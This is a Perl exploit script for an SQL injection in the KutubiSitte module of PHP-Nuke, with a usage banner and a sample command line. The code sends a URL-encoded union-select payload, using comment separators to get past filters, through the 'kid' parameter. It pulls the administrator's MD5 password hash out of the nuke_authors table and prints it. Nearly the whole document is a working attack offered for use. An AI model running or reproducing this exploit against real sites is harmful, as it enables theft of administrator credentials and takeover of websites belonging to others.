#!/usr/bin/perl use Getopt::Std;
use LWP::UserAgent;

sub usg{
printf("


  -#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
  |  PHP-NUKE  KutubiSitte [kid]  =>  SQL Injection   |
  -#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 #######################################################
 # Bug by Lovebug Exploit-Code by r080cy90r from RBT-4 #
 #######################################################
<-<->-<->-<->-<->-<->-<->-<->-<->-<->-<->-<->-<->-<->-<->->
#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#
#:-------------------------------------------------------:#
:#|                    USAGE:                           |#:
:#| exploit.pl -h [Hostname] -p [Path] -U [User_Id]     |#:
#:-------------------------------------------------------:#
#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#
#:-------------------------------------------------------:#
:#|                   EXAMPLE:                          |#:
:#|  exploit.pl -h http://site.com -p /php-nuke/ -U 1   |#:
#:-------------------------------------------------------:#
#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#:#


");
}
sub problem{
   print "\n\n[~] SITO NON VULNERABILE [~]\n\n";
   exit();
}
sub exploitation{
      $conn = LWP::UserAgent -> new;
   $conn->agent('Checkbot/0.4 ');
   $query_pwd =
$host.$path."modules.php?name=KutubiSitte&h_op=hadisgoster&kid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C0,aid,pwd,4%2F%2A%2A%2Ffrom%2F%2A%2A%
2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D".$user_id."%2F%2A";
   $return_pwd = $conn->get($query_pwd) || problem();
   $return_pwd->content() =~ /([0-9,a-f]{32})/ || problem();
   print "\n \[~\] Admin Password(md5)=$user_id is: $1 \[~\]\n\n ";
  }

getopts(":h:p:U:",\%args);
    $host = $args{h} if (defined $args{h});
    $path = $args{p} if (defined $args{p});
    $user_id= $args{U}if (defined $args{U});
        if (!defined $args{h} || !defined $args{p} || !defined $args{U}){
       usg();
    }
    else{
       exploitation();
    }